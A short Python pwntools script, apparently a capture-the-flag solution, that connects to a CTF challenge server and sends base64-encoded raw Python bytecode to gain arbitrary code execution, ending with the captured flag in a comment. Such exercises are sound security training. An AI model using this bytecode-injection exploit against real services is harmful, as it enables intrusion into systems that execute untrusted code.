#!/usr/bin/env python3

from pwn import *
import base64, binascii

p = remote('kinda-arbitrary-code-execution.crewctf-2022.crewc.tf', 1337)
code = bytearray(binascii.unhexlify('740274008301a0006402a1015300'))
p.sendline(base64.b64encode(code))
p.interactive()

### crew{G00D_j08_0n_7h3_W4rMuP_4r3_y0U_R34dY_F0r_7h3_N3x7_573p?} ###